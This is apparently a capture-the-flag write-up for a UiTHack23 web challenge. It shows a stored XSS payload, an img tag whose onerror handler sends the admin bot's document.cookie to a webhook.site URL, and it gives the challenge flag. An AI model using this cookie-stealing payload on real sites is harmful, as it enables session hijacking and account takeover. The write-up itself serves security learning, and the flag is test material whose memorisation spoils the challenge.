>#  Flags 24/7 
>Bill gates approves this design

# Writeup

Initialize some type of server to catch requests. Due to university network restrictions we weere not able to send request between own subdomains, and had to use a public service.

[https://webhook.site/](https://webhook.site/)

Add xss script to the form data
```<img src=x onerror="this.src='https://webhook.site/3dfcb0ae-77ef-40f3-b844-154f74b62185/?'+document.cookie; this.removeAttribute('onerror');">```

Cronjob/admin is set to load the admin page every minute. The script is forced to do an `onError` as the src is faulty.  It triggers the script and will send a request with the cookie as parameter back to the address/server initialized.

`UiTHack23{xxspl0its_4r3_phun}`

